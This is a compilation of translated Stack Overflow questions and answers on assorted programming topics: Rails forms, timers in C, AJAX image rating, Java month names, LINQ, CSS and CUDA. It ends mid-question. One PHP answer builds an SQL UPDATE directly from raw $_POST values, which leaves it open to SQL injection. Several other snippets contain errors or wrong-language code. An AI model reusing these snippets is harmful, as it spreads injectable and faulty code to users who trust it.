我的表格如下所示：

```
<%= form_for 'users[]', :url => approve_users_path, :html => {:class => 'form-horizontal'} do |f| %>
<tbody>
  <% for user in @users %>
    <%= fields_for user do |u| %>
      <tr>
        <td><%= user.name %></td>
        <td><%= u.check_box :vouched %></td>
      </tr>
   <% end %>
  <% end %>
</tbody>
<% end %> 
```

这会产生

```
<tr>
  <td>steve cabillero</td>
  <td><input name="user[vouched]" type="hidden" value="0" /><input id="user_vouched" name="user[vouched]" type="checkbox" value="1" /></td> 
```

但是，我需要以 users[id][vouched] 形式输入的名称，并且 vouched 是一个虚拟属性。

当我尝试使用 f.check_box 时，我得到一个方法未找到错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:08:40.423

`form_tag`如果您没有使用表单中的特定资源，则应该使用。我还建议使用`#each`而不是 for 循环和 check_box_tag 复选框

```
<%= form_tag approve_users_path, :class => 'form-horizontal' do %>
  <tbody>
    <% @users.each do |user| %>
      <tr>
        <td><%= user.name %></td>
        <td><%= check_box_tag "users[#{user.id}][vouched]" %></td>
      </tr>
    <% end %>
  </tbody>
<% end %> 
```

# c - 在c中不使用线程和sleep()方法定期调用函数

> ID：14832139
> 
> 赞同：2
> 
> 时间：2013-02-12T12:03:19.487
> 
> 标签：c

我想调用一个函数，假设每 10 或 20 秒一次。`sleep()`当我搜索时，我到处都想出了线程和方法。

我还检查了 C 中的时间和时钟类，但我找不到任何对我的问题有帮助的东西。

定期调用函数的最简单方法是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-12T12:16:36.247

在我看来，使用`libevent`是更清洁的解决方案，因为与此同时，您可以执行其他操作（甚至是其他定时功能）

看看这个每 3 秒打印一次 Hello 的简单且自我解释的示例：

```
#include <stdio.h>
#include <sys/time.h>
#include <event.h>

void say_hello(int fd, short event, void *arg)
{
  printf("Hello\n");
}

int main(int argc, const char* argv[])
{
  struct event ev;
  struct timeval tv;

  tv.tv_sec = 3;
  tv.tv_usec = 0;

  event_init();
  evtimer_set(&ev, say_hello, NULL);
  evtimer_add(&ev, &tv);
  event_dispatch();

  return 0;
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-02-12T12:06:51.843

大多数操作系统都有“设置警报”或“设置计时器”的方法，这将在未来的给定时间调用您的函数。在 linux 中，您将使用`alarm`，在 Windows 中，您将使用`SetTimer`.

这些函数对你在被调用的函数中可以做什么有限制，而且你几乎肯定最终会得到一个有多个线程的东西——尽管线程可能不是在调用`sleep`，而是一些`wait_for_event`或类似的函数。

编辑：但是，使用包含以下线程的线程：

```
while(1) 
{
   sleep(required_time); 
   function(); 
} 
```

问题以一种非常直接的方式解决了问题，并且非常容易处理。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-12T12:08:56.560

尝试这个：

```
while(true) {
   if(System.getNanotime % 20 == 0) {
      myFunction();
   } 
} 
```

这是在 Java 语法中，我已经 5 年多没有编程 c 了，但也许它可以帮助你 :)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-12T12:08:13.747

一个天真的解决方案是这样的：

```
/* Infinite loop */
time_t start_time = time(NULL);
for (;;)
{
    time_t now = time(NULL);

    time_t diff = now - start_time;

    if ((diff % 10) == 0)
    {
        /* Ten seconds has passed */
    }

    if ((diff % 20) == 0)
    {
        /* Twenty seconds has passed */
    }
} 
```

您可能需要一个标志来指示该函数是否已被调用，或者它会在一秒钟内被调用多次`(diff % 10) == 0`为真。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-12T12:09:31.080

简单的：

```
#include <stdio.h>
#include <unistd.h>

int main(int argc, const char** argv)
{
    while(1)
    {
        usleep(20000) ;
        printf("tick!\n") ;
    }
} 
```

请注意， usleep() 当然会阻止:)

# php - 只更新部分页面

> ID：14832144
> 
> 赞同：1
> 
> 时间：2013-02-12T12:03:36.563
> 
> 标签：php, javascript, jquery, ajax, updating

我最近创建了一个网站，允许用户上传图片，然后让该用户和网站的其他用户从 1 到 10 对图片进行评分。一切正常。当用户对图像进行评分时，将保存该图像，然后生成另一个随机框并将其呈现给用户。这通过将新的框 id（随机生成）添加到查询字符串来工作。这允许用户导航回他们刚刚看到的图像。

我的问题来自更新页面。目前，我的代码处理评分并将其保存在数据库中，然后将用户重定向到同一页面，我有一些代码可以从数据库中找到随机图像 id，然后使用该 id 将它们再次重定向到具有 id 的同一页面查询字符串。这很好用，但是我想让它只更新图像和图像信息（图像名称评级等），而 HTML 的其余部分（页眉、导航、侧边栏、页脚等......）不是。

据我了解，您可以使用 JQuery/Javascrip/AJAX 上传网站的一部分吗？但是，这将不允许用户重定向回之前查看的图像？

如果您想了解更多信息，请询问。

**编辑**

我已经获取了一些信息，并更改了我的代码以使用哈希值，我的代码如下：

**HTML**

```
<img id="design" alt="" width="300" height="300"  />
<input type="button" id="GetImage" value="Get Image" /> 
```

**查询**

```
$(document).ready(function(){

    $("#GetImage").click(function() {

        $.ajax({ //Make the Ajax Request
                 type: "POST",
                 url: "testimagelook.php", //file name
                 success: function(server_response){
                    var id = server_response;
                    document.location.hash = id;
                    $('#design').attr('src','img/boxes/'+id+'.png');
                 }
        });
    });

}); 
```

php 文件 testimagelook.php 连接到数据库并带回我的一张图像的随机 id。此代码可以很好地显示图像并将图像的 id 保存在 URL 的哈希中，从而允许我保留图像的用户历史记录。但是，当用户单击后退按钮时，我不确定如何检索先前的哈希值并使用正确的 id 重新加载图像。有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T12:07:32.503

是的，您可以使用 jQuery AJAX 方法来实现这一点
为简单起见，请使用此

```
$.post('pageURL.php', {data1: value1}, function(result) {
  // Update the portion of the page you wish to

}); 
```

**更新**

```
$.ajax({
  type: "POST",
  url: "PageName.aspx/MethodName",
  data: "{}",
  contentType: "application/json; charset=utf-8",
  dataType: "json",
  success: function(data) {
    // Now receive the data (information) in the form of JSON
    // In this JSON you can pass the imageID or anything to proceed your logic
    // and update the portion of the page you wish to
  }
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T12:08:53.483

有几种方法可以做你喜欢的事情。

较新的（支持 html5 的）浏览器向客户端公开了一个 History 对象，该对象可用于添加和删除历史记录（后退按钮）位置。

[https://developer.mozilla.org/en-US/docs/DOM/Manipulating_the_browser_history](https://developer.mozilla.org/en-US/docs/DOM/Manipulating_the_browser_history)

但这仍然是新的，你不能强迫你的用户使用更新的浏览器。

“始终”有效的一种方法是将`#yourId`锚点添加到对象的 href 成员中，`document.location`以识别您的图像。然后，这将自动保存在浏览器历史记录中。然后，要使用此信息，您必须确保捕捉到`document.location`对象中的更改，并通过 Ajax 请求使用适当的数据更新您的图像视图。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T12:21:14.043

我自己也在编写类似的代码，你可以尝试这样的事情：

新图像.js：

```
function newImage(id,rate) {
    $('.wrapper').empty();
    $.ajax({
        url:'dbfunction.php',
        type:'POST',
        data: { 'imageid': i, 'rating':rate }
    }).success(function(){
        // Using jquery append new information inside wrapper      
    });
} 
```

dbfunction.php：

```
<?php
    mysql_query("UPDATE table SET rating='".$_POST['rating']."' WHERE id='".$_POST['id']."'");

    // Get new id from db
    echo json_encode($new_id);
?> 
```

这是一个非常小的示例，可以帮助您入门。任何问题都可以问。更多信息可以在[这里](http://api.jquery.com/jQuery.ajax/)和[这里](http://api.jquery.com/append/)找到。

为了澄清一点，我在我的[网页](http://letsscrim.com/thr3s)上使用了类似的代码。您无需每次更新页面即可访问所有信息。所有页面历史记录都保存在全局数组中。请记住，该网页正在制作中，并非全部功能！

# java - 如何从日历中获取月份名称？

> ID：14832151
> 
> 赞同：107
> 
> 时间：2013-02-12T12:04:04.863
> 
> 标签：java, calendar

当我们知道时，是否有一个 oneliner 来获取月份名称：

```
int monthNumber  = calendar.get(Calendar.MONTH) 
```

或者什么是最简单的方法？

* * *

## 回答 #1

> 赞同：208
> 
> 时间：2013-02-12T12:05:43.027

您可以使用 来实现它[`SimpleDateFormat`](http://docs.oracle.com/javase/7/docs/api/java/text/SimpleDateFormat.html)，这意味着格式化日期和时间：

```
Calendar cal = Calendar.getInstance();
System.out.println(new SimpleDateFormat("MMM").format(cal.getTime())); 
```

* * *

## 回答 #2

> 赞同：102
> 
> 时间：2013-02-12T12:09:15.020

```
String getMonthForInt(int num) {
    String month = "wrong";
    DateFormatSymbols dfs = new DateFormatSymbols();
    String[] months = dfs.getMonths();
    if (num >= 0 && num <= 11) {
        month = months[num];
    }
    return month;
} 
```

* * *

## 回答 #3

> 赞同：82
> 
> 时间：2014-04-24T10:42:43.903

就这么简单

```
mCalendar = Calendar.getInstance();    
String month = mCalendar.getDisplayName(Calendar.MONTH, Calendar.LONG, Locale.getDefault()); 
```

* * *

## 回答 #4

> 赞同：41
> 
> 时间：2013-10-31T01:14:55.007

这是我为班级项目提出的解决方案：

```
public static String theMonth(int month){
    String[] monthNames = {"January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"};
    return monthNames[month];
} 
```

你传入的号码来自一个`Calendar.MONTH`电话。

* * *

## 回答 #5

> 赞同：37
> 
> 时间：2015-01-17T17:40:35.467

如果您有多语言界面，您可以使用`getDisplayName`显示语言来控制显示月份的名称。

以下是在特定国家/地区（例如“叙利亚”）以英语、法语、阿拉伯语和阿拉伯语显示月份名称的示例：

```
Calendar c = Calendar.getInstance();
System.out.println(c.getDisplayName(Calendar.MONTH, Calendar.LONG, Locale.ENGLISH ) );
System.out.println(c.getDisplayName(Calendar.MONTH, Calendar.LONG, Locale.FRANCE ) );
System.out.println(c.getDisplayName(Calendar.MONTH, Calendar.LONG, new Locale("ar") ) );
System.out.println(c.getDisplayName(Calendar.MONTH, Calendar.LONG, new Locale("ar", "SY") ) );
System.out.println(c.getTime().toString()); 
```

结果是：

```
January
janvier
يناير
كانون الثاني
Sat Jan 17 19:31:30 EET 2015 
```

* * *

## 回答 #6

> 赞同：17
> 
> 时间：2014-08-15T15:42:18.413

```
SimpleDateFormat dateFormat = new SimpleDateFormat( "LLLL", Locale.getDefault() );
dateFormat.format( date ); 
```

对于某些语言（例如俄语），这是获取独立月份名称的唯一正确方法。

`getDisplayName`如果您从`Calendar`或`DateFormatSymbols`一月开始使用，这就是您得到的：

**января**（对于完整的日期字符串是正确的：“ **10 января, 2014** ”）

但如果是独立的月份名称，您会期望：

**январь**

* * *

## 回答 #7

> 赞同：12
> 
> 时间：2013-02-12T12:10:18.073

# 乔达时间

[使用Joda-Time](http://www.joda.org/joda-time/)怎么样。这是一个更好的日期时间 API （这里`January`指的是一月。它不像日历，它使用`0-based`数月的索引）。

您可以使用[`AbstractDateTime#toString( pattern )`](http://www.joda.org/joda-time/apidocs/org/joda/time/base/AbstractDateTime.html#toString(java.lang.String))方法以指定格式格式化日期：

```
DateTime date = DateTime.now();
String month = date.toString("MMM"); 
```

## 月份名称来自数字

如果您想要特定月份编号的月份名称，您可以这样做：

```
int month = 3;
String monthName = DateTime.now().withMonthOfYear(month).toString("MMM"); 
```

## 本地化

上述方法使用您的 JVM 当前的默认语言环境作为月份名称的语言。您想指定一个 Locale 对象。

```
String month = date.toString( "MMM", Locale.CANADA_FRENCH ); 
```

* * *

## 回答 #8

> 赞同：11
> 
> 时间：2017-04-17T12:37:27.830

# `Month::getDisplayName`

从 Java 8 开始，使用[`Month`](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/time/Month.html)枚举。该[`getDisplayName`](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/time/Month.html#getDisplayName(java.time.format.TextStyle,java.util.Locale))方法自动本地化月份的名称。

经过：

*   A[`TextStyle`](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/time/format/TextStyle.html)确定多长或多短。
*   A[`Locale`](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/Locale.html)指定翻译中使用的人类语言，以及用于缩写、标点符号等的文化规范。

例子：

```
public static String getMonthStandaloneName(Month month) {
    return month.getDisplayName(
        TextStyle.FULL_STANDALONE, 
        Locale.getDefault()
    );
} 
```

* * *

## 回答 #9

> 赞同：10
> 
> 时间：2017-01-25T14:14:42.773

这可能是一个老问题，但作为一个在我们知道索引时获得月份名称的单行程序，我使用了

```
String month = new DateFormatSymbols().getMonths()[monthNumber - 1]; 
```

或简称

```
String month = new DateFormatSymbols().getShortMonths()[monthNumber - 1]; 
```

请注意，您`monthNumber`从 1 开始计数，而上述任何方法都返回一个数组，因此您需要从 0 开始计数。

* * *

## 回答 #10

> 赞同：4
> 
> 时间：2017-12-05T09:03:12.723

此代码具有语言支持。我曾在 Android 应用程序中使用过它们。

```
String[] mons = new DateFormatSymbols().getShortMonths();//Jan,Feb,Mar,... 

String[] months = new DateFormatSymbols().getMonths();//January,Februaty,March,... 
```

* * *

## 回答 #11

> 赞同：3
> 
> 时间：2019-05-07T07:24:20.887

我发现这更容易（[https://docs.oracle.com/javase/tutorial/datetime/iso/enum.html](https://docs.oracle.com/javase/tutorial/datetime/iso/enum.html)）

```
private void getCalendarMonth(Date date) {      
    Calendar calendar = Calendar.getInstance();
    calendar.setTime(date);
    Month month = Month.of(calendar.get(Calendar.MONTH));       
    Locale locale = Locale.getDefault();
    System.out.println(month.getDisplayName(TextStyle.FULL, locale));
    System.out.println(month.getDisplayName(TextStyle.NARROW, locale));
    System.out.println(month.getDisplayName(TextStyle.SHORT, locale));
} 
```

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2015-04-08T21:56:00.583

你可以像这样得到它：

```
String monthName = new DataFormatSymbols.getMonths()[cal.get(Calendar.MONTH)] 
```

* * *

## 回答 #13

> 赞同：2
> 
> 时间：2016-09-12T20:09:49.173

这对我有用：

```
String getMonthName(int monthNumber) {
    String[] months = new DateFormatSymbols().getMonths();
    int n = monthNumber-1;
    return (n >= 0 && n <= 11) ? months[n] : "wrong number";
} 
```

`"September"`用一行返回：

```
String month = getMonthName(9); 
```

* * *

## 回答 #14

> 赞同：2
> 
> 时间：2018-11-12T09:30:05.517

**单程：**

我们有`Month`Java 中的 API ( `java.time.Month`)。我们可以通过使用`Month.of(month);`

在这里，它们`Month`被索引为数字，因此您可以提供`Month.JANUARY`或在上述 API 中提供索引，例如 1、2、3、4。

**第二种方式：**

```
ZonedDateTime.now().getMonth(); 
```

这在`java.time.ZonedDateTime`.

* * *

## 回答 #15

> 赞同：2
> 
> 时间：2020-12-09T15:33:11.373

```
Calender cal = Calendar.getInstance(Locale.ENGLISH)
String[] mons = new DateFormatSymbols(Locale.ENGLISH).getShortMonths();
int m = cal.get(Calendar.MONTH);
String mName = mons[m]; 
```

* * *

## 回答 #16

> 赞同：2
> 
> 时间：2021-06-09T16:37:37.923

最简单的方法

```
import java.text.DateFormatSymbols;

int month = 3; // March
System.out.println(new DateFormatSymbols().getMonths()[month-1]); 
```

* * *

## 回答 #17

> 赞同：1
> 
> 时间：2018-06-28T10:30:38.647

它返回月份的英文名称。04 返回 APRIL 等等。

```
String englishMonth (int month){
        return Month.of(month);
    } 
```

* * *

## 回答 #18

> 赞同：1
> 
> 时间：2019-01-10T13:56:24.530

我根据本主题中的响应创建了一个 Kotlin 扩展，并使用`DateFormatSymbols`您获得本地化响应的答案。

```
fun Date.toCalendar(): Calendar {
    val calendar = Calendar.getInstance()
    calendar.time = this
    return calendar
}

fun Date.getMonthName(): String {
    val month = toCalendar()[Calendar.MONTH]
    val dfs = DateFormatSymbols()
    val months = dfs.months
    return months[month]
} 
```

* * *

## 回答 #19

> 赞同：1
> 
> 时间：2019-03-19T12:48:36.743

```
import java.text.SimpleDateFormat;
import java.util.Calendar;

Calendar cal = Calendar.getInstance();
String currentdate=new SimpleDateFormat("dd-MMM").format(cal.getTime()); 
```

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2016-10-10T06:16:44.383

```
DateFormat date =  new SimpleDateFormat("dd/MMM/yyyy");
Date date1 = new Date();
System.out.println(date.format(date1)); 
```

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2021-09-28T09:30:07.703

对于月份的全名：

```
val calendar = Calendar.getInstance()
calendar.timeInMillis = date
return calendar.getDisplayName(Calendar.MONTH, Calendar.Long, Locale.ENGLISH)!!.toString() 
```

而对于月份的简称：

```
val calendar = Calendar.getInstance()
calendar.timeInMillis = date
return calendar.getDisplayName(Calendar.MONTH, Calendar.SHORT, Locale.ENGLISH)!!.toString() 
```

* * *

## 回答 #22

> 赞同：-3
> 
> 时间：2016-10-31T04:01:47.190

来自 SimpleDateFormat java 文档：

```
*         <td><code>"yyyyy.MMMMM.dd GGG hh:mm aaa"</code>
 *         <td><code>02001.July.04 AD 12:08 PM</code>
 *         <td><code>"EEE, d MMM yyyy HH:mm:ss Z"</code>
 *         <td><code>Wed, 4 Jul 2001 12:08:56 -0700</code> 
```

# java - 试图修复我的代码，但我一直失败:(

> ID：14832152
> 
> 赞同：2
> 
> 时间：2013-02-12T12:04:08.057
> 
> 标签：java, android, listview, imageview

我有这段代码可以使用`ListView`. 但如图所示，当它走到照片的末尾时它会死掉（最后几个像素在不应该的时候进行）。

我不希望照片占据整个页面，只是照片的大小。这是代码和XML：

**流项目 xml：**

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="wrap_content" >

</RelativeLayout> 
```

**活动流xml：**

```
<ListView xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:id="@+id/main_list"
    android:layout_width="wrap_content"
    android:layout_height="match_parent"
    android:divider="@null"
    android:dividerHeight="0px"
    android:drawSelectorOnTop="true"
    tools:context=".StreamActivity" /> 
```

**主要代码：**

```
public class StreamActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_stream);

        StreamAdapter adapter = new StreamAdapter(this);
        ((ListView) findViewById(R.id.main_list)).setAdapter(adapter);

        adapter.add(new StreamItem(this, R.drawable.testimage1, null, null));
        adapter.add(new StreamItem(this, R.drawable.testimage1, null, null));
        adapter.add(new StreamItem(this, R.drawable.testimage1, null, null));
        adapter.add(new StreamItem(this, R.drawable.testimage1, null, null));

    }

    class StreamItem {
        final Bitmap mBitmap;

        StreamItem(Context c, int resid, String line1, String line2) {
            mBitmap = BitmapFactory.decodeResource(c.getResources(), resid);

        }
    }

    class StreamDrawable extends Drawable {
        private static final boolean USE_VIGNETTE = true;

        private final float mCornerRadius;
        private final RectF mRect = new RectF();
        private final BitmapShader mBitmapShader;
        private final Paint mPaint;
        private final int mMargin;

        StreamDrawable(Bitmap bitmap, float cornerRadius, int margin) {
            mCornerRadius = cornerRadius;

            mBitmapShader = new BitmapShader(bitmap,
                    Shader.TileMode.CLAMP, Shader.TileMode.CLAMP);

            mPaint = new Paint();
            mPaint.setAntiAlias(true);
            mPaint.setShader(mBitmapShader);

            mMargin = margin;
        }

        @Override
        protected void onBoundsChange(Rect bounds) {
            super.onBoundsChange(bounds);
            mRect.set(mMargin, mMargin, bounds.width() - mMargin, bounds.height() - mMargin);

            if (USE_VIGNETTE) {
                RadialGradient vignette = new RadialGradient(
                        mRect.centerX(), mRect.centerY() * 1.0f / 0.7f, mRect.centerX() * 1.3f,
                        new int[] { 0, 0, 0x7f000000 }, new float[] { 0.0f, 0.7f, 1.0f },
                        Shader.TileMode.CLAMP);

                Matrix oval = new Matrix();
                oval.setScale(1.0f, 0.7f);
                vignette.setLocalMatrix(oval);

                mPaint.setShader(
                        new ComposeShader(mBitmapShader, vignette, PorterDuff.Mode.SRC_OVER));
            }
        }

        @Override
        public void draw(Canvas canvas) {
            canvas.drawRoundRect(mRect, mCornerRadius, mCornerRadius, mPaint);
        }

        @Override
        public int getOpacity() {
            return PixelFormat.TRANSLUCENT;
        }

        @Override
        public void setAlpha(int alpha) {
            mPaint.setAlpha(alpha);
        }

        @Override
        public void setColorFilter(ColorFilter cf) {
            mPaint.setColorFilter(cf);
        }       
    }

    class StreamAdapter extends ArrayAdapter<StreamItem> {
        private static final int CORNER_RADIUS =100; // dips
        private static final int MARGIN = 1; // dips

        private final int mCornerRadius;
        private final int mMargin;
        private final LayoutInflater mInflater;

        public StreamAdapter(Context context) {
            super(context, 0);

            final float density = context.getResources().getDisplayMetrics().density;
            mCornerRadius = (int) (CORNER_RADIUS * density + 0.5f);
            mMargin = (int) (MARGIN * density + 0.5f);

            mInflater = LayoutInflater.from(getContext());
        }

        @Override
        public View getView(int position, View convertView, ViewGroup parent) {
            ViewGroup view = null;

            if (convertView == null) {
                view = (ViewGroup) mInflater.inflate(R.layout.stream_item, parent, false);
            } else {
                view = (ViewGroup) convertView;
            }

            StreamItem item = getItem(position);

            StreamDrawable d = new StreamDrawable(item.mBitmap, mCornerRadius, mMargin);
            view.setBackgroundDrawable(d);

            int w = item.mBitmap.getWidth();
            int h = item.mBitmap.getHeight();

            float ratio = w / (float) h;

            LayoutParams lp = view.getLayoutParams();
            lp.width = getContext().getResources().getDisplayMetrics().widthPixels;
            lp.height = (int) (lp.width / ratio);

            return view;
        }
    }
} 
```

![在此处输入图像描述](../Images/39d8faeecf00dd4dbcdff4e6e923dcc6.png)

# mysql - 使用带有参数类型和参数值列的 MySQL 表是否清晰？

> ID：14832154
> 
> 赞同：0
> 
> 时间：2013-02-12T12:04:26.310
> 
> 标签：mysql, database

我有一个包含案例的表格，但每个案例都可以填写不同的参数。所以我认为这样安排表格并不是最好的解决方案（例如 - 实际参数会更多）：

**`case`**

```
+----+-------+--------+-------+------------+-------+
| id | label | color  | count | time       | valid |
+----+-------+--------+-------+------------+-------+
| 1  | abcd  | NULL   | 4     | 2013-01-15 | 0     |
| 2  | efgh  | NULL   | NULL  | 2012-12-22 | NULL  |
| 3  | ijkl  | fa8ee0 | NULL  | NULL       | 1     |
| 4  | mnop  | NULL   | 1     | NULL       | 1     |
| ... 
```

这包含很多*NULL*值。

还有另一种解决方案，其中存在相关表`case_params`，其概念是这样的：

```
`case`                      `case_params`
+----+-------+              +---------+------------+-------------+
| id | label |              | case_id | param_type | param_value |
+----+-------+              +---------+------------+-------------+
| 1  | abcd  |              | 1       | count      | 4           |
| 2  | efgh  |              | 1       | time       | 2013-01-15  |
| 3  | ijkl  |              | 1       | valid      | 0           |
| 4  | mnop  |              | 2       | time       | 2012-12-22  |
| ...                       | 3       | color      | fa8ee0      |
                            | ... 
```

但是列出现了问题`param_value`- 我可以将其设置为*VARCHAR(32)*，并制作触发器来控制每个参数类型（如果其值正确）。但我不确定这是否是明确的解决方案......

你会如何**解决**这样的问题？谢谢

*抱歉，英语不好，不是母语人士*

# linq - LINQ - 在可为空的字段上使用 OrderBy 进行排序

> ID：14832156
> 
> 赞同：2
> 
> 时间：2013-02-12T12:04:29.463
> 
> 标签：linq

我正在尝试`Enumerable<DataRow>`通过在可为空的 Int32 字段上使用 LINQ 的 OrderBy 方法对类型集合进行排序。由于此字段的某些值为空，Visual Studio 会引发 System.ArgumentException，并带有消息“对象必须是 Int32 类型。” 这是有问题的代码行：

```
collection1 = collection1.OrderBy(row => row["Column1"]); 
```

其中 Column1 是可为空的 Int32 字段，变量`collection1`声明为：

```
IEnumerable<DataRow> collection1; 
```

有没有办法重写上面的行以使其忽略空值？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-12T12:08:25.713

您可以使用三元条件运算符：

```
collection1 = collection1.OrderBy(row => 
  row["Column1"] != null ? row["Column1"] : low_priority_indicator); 
```

其中`low_priority_indicator`是一个整数，表示标准的低阶（相对于您的优先级）值。否则，如果您想从结果集合中完全排除，您可以在订购*前*过滤掉这些`null`值。

 ** * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-02-12T12:24:20.990

试试这个：

```
collection1.OrderBy(row => row.Field<int?>("Column1")); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T12:08:05.447

尝试以下操作：

```
collection1 = collection1.Where(row => row["Column1"] != null).
    OrderBy(row => row["Column1"]); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-12T12:08:38.010

这将忽略这些值 - 试试这个：

```
collection1 = collection1
                .Where(c => c["Column1"].HasValue)
                .OrderBy(row => row["Column1"]); 
```*

# printing - 如何将具有正确名称的 pcl 文件放入 win spooler

> ID：14832161
> 
> 赞同：0
> 
> 时间：2013-02-12T12:04:36.487
> 
> 标签：printing, printer-control-language, spooler

当我将 pcl 文件复制到 windows spooler 时，我无法在 spooler 中设置该文件的名称和页数。我从命令行用一个简单的副本来做

```
copy file.pcl printer 
```

如何复制文件以查看它的名称和后台打印程序中页面的 nbr？JAVA可以帮助做到这一点吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T23:04:29.953

将文件复制到打印机不会得到页数，因为后台处理程序不会知道文件内容的任何内容。在打印作业时的正常操作下，通过 GDI 子系统对 StartPagePrinter api 调用进行调用，这是后台处理程序知道文档中有多少页的方式，但是当您使用复制功能时不会发生这种情况。

如果您知道 PCL 文档的页数，那么您可以查看使用 SetJob 假脱机 API 函数来适当地设置 TotalPages 计数。以这种方式向 spooler 添加作业需要进行以下 API 调用：

1.  开放式打印机
2.  添加工作
3.  设置作业
4.  计划工作
5.  关闭打印机

# css - 带有 CSS 的鼠标悬停时弹出图像的缩略图

> ID：14832164
> 
> 赞同：5
> 
> 时间：2013-02-12T12:04:43.810
> 
> 标签：css, popup, mouseover

我有一排设置为向左浮动的缩略图（容器元素）；缩略图按比例缩小以适应一行。

```
<style type="text/css">
    .thumbnails{
        float:left;
        position:relative;
    }
    .thumbnails img{
        /* ... */
        width:65px;
        height:47px;
    }
</style> 
```

当用户将鼠标悬停在缩略图上时，我想以原始大小显示缩略图的弹出窗口：

```
<style type="text/css">
    /* in addition to the above... */
    .th_selector:hover img{

        position:absolute;
        top:-30px;
        left:-30px;

        width:150px;
        height:113px;

        display:block;
        z-index:999;
    }
</style> 
```

一旦我将鼠标移到缩略图上，就会显示更大的图像（如预期的那样）。但我有两个问题：1）其他缩略图向左跳一个位置。它们最终位于弹出图像下方。这也可以产生闪烁（取决于鼠标指针的位置）。2）如果窗口太小，如果有两行缩略图，有一个换行符（这不是很好）。

我怎样才能创建一行带有漂亮悬停图像的缩略图，同时保持缩略图的原始位置？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-02-12T18:08:07.587

```
.thumbnails {
    float:left;
    position:relative;
    width: 65px;
    margin-right: 10px;
}
.thumbnails img{
    position:relative;
    display:block;
    width:65px;
    height:47px;
}    
.thumbnails:hover img {
    top:-25px;
    left:-40px;
    width:150px;
    height:100px;
    z-index:999;
} 
```

[http://jsfiddle.net/functionfirst/V4YaQ/1/](http://jsfiddle.net/functionfirst/V4YaQ/1/)

在您的代码示例中，您不应使用绝对位置，因为此声明会从文档流中删除元素。这实质上意味着该元素在页面上不再有“足迹”，因此右侧的缩略图有效地折叠在现在绝对定位的元素下。

# jquery - 是否可以自定义 Jquery 数据表默认生成的 dom 结构？

> ID：14832170
> 
> 赞同：0
> 
> 时间：2013-02-12T12:05:10.973
> 
> 标签：jquery, html, css, datatable

我正在使用在[http://datatables.net/api](http://datatables.net/api)找到的 Jquery 数据表插件。该插件会生成自己的搜索框，如果启用，它会在初始化时将其插入页面。创建搜索框时，它会嵌套在自己的 div 中，如下所示：

```
<div>
    <!-- search code -->
</div>
<table>
    <!-- table data -->
</table> 
```

我想在不移动搜索框的情况下在表格上有一个滚动条，以便它始终可见。溢出-y：滚动；在表格元素上似乎对我不起作用，但在 div 上起作用。那正确吗？如果我将样式应用于父容器，则如果用户向下滚动，则搜索框不可见。我尝试自己将元素物理移动到所需的设置，即：

```
<div>
    <!-- Search Code -->
</div>
<div style="overflow-y:scroll;"> <!-- actually in a class but this shows what it is. -->
    <table>
        <!-- table data -->
    </table>
</div> 
```

正如所料，这会破坏插件生成的搜索框。所以我的问题是，我是否可以使用插件的内置搜索功能来达到预期的结果，也许以某种方式使用像“sdom”这样的参数，还是我需要硬着头皮推出自己的搜索/过滤功能？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-27T09:13:29.007

我找到的解决方案只是关闭内置过滤器并编写我自己的等效项，我可以将其放置在我喜欢的任何地方。

[http://jsfiddle.net/KwXby/5/](http://jsfiddle.net/KwXby/5/)

```
$(document).ready(function(){
  $("#tableFilter").bind("change keyup", function(){
  var tableRows = $('.dataTable:visible').find('tbody').find('tr');
  var filterText = $(this).val();
  $(tableRows).each(function() {
    if ($(this).text().indexOf(filterText ) >= 0) {
      $(this).show();
    } else {
      $(this).hide();
    }
  });
  });
}); 
```

编辑：我后来发现我需要能够使用空格分隔的搜索词搜索多个列，如果没有找到，则提供一个空表行，这需要更新。

[http://jsfiddle.net/KwXby/11/](http://jsfiddle.net/KwXby/11/)

# cuda - CUDA 块并行性

> ID：14832173
> 
> 赞同：3
> 
> 时间：2013-02-12T12:05:17.067
> 
> 标签：cuda, gpu, nvidia

我正在 CUDA 中编写一些代码，并且对实际并行运行的内容有些困惑。

1.  假设我正在调用这样的内核函数：`kenel_foo<<<A, B>>>`. 现在根据我下面的设备查询，每个块最多可以有 512 个线程。那么我是否保证每次运行时每个块都会进行 512 次计算`kernel_foo<<<A, 512>>>`？但是[这里](http://www.cc.gatech.edu/~vetter/keeneland/tutorial-2012-02-20/06-cuda-overview.pdf)说一个线程在一个 CUDA 核心上运行，这意味着我可以同时运行 96 个线程吗？（请参阅下面的 device_query）。

